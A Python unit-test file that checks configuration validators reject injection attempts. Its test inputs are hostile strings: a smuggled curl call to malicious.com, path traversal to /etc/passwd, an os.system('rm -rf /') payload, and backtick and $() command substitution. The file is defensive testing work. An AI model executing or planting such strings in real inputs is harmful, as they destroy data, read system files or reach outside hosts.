"""Unit tests for configuration validators and injection protection."""

import pytest

from nhl_scrabble.config_validators import (
    ConfigValidationError,
    validate_enum,
    validate_positive_float,
    validate_positive_int,
    validate_safe_path,
)


class TestInjectionScenarios:
    """Test comprehensive injection attack scenarios."""

    def test_prevents_shell_command_in_timeout(self) -> None:
        """Test prevention of shell command injection in timeout config."""
        with pytest.raises(ConfigValidationError):
            validate_positive_int("10; curl malicious.com", min_val=1, max_val=100)

    def test_prevents_path_traversal_in_output_file(self) -> None:
        """Test prevention of path traversal in output file config."""
        with pytest.raises(ConfigValidationError, match=r"Path outside working directory"):
            validate_safe_path("../../../etc/passwd")

    def test_prevents_code_injection_in_format(self) -> None:
        """Test prevention of code injection in format config."""
        with pytest.raises(ConfigValidationError):
            validate_enum("json'); import os; os.system('rm -rf /", {"text", "json", "html"})

    def test_prevents_backtick_command_substitution(self) -> None:
        """Test prevention of backtick command substitution."""
        with pytest.raises(ConfigValidationError):
            validate_positive_int("`whoami`", min_val=1, max_val=100)

    def test_prevents_dollar_command_substitution(self) -> None:
        """Test prevention of dollar command substitution."""
        with pytest.raises(ConfigValidationError):
            validate_positive_float("$(cat /etc/passwd)", min_val=0.0, max_val=10.0)

    def test_prevents_newline_injection(self) -> None:
        """Test prevention of newline injection."""
        with pytest.raises(ConfigValidationError):
            validate_enum("text\nmalicious_command", {"text", "json", "html"})

    def test_prevents_null_byte_in_path(self) -> None:
        """Test prevention of null byte in path."""
        # Null bytes would be caught by Path() validation
        # This is more of a defensive test
        # Path() handles this internally
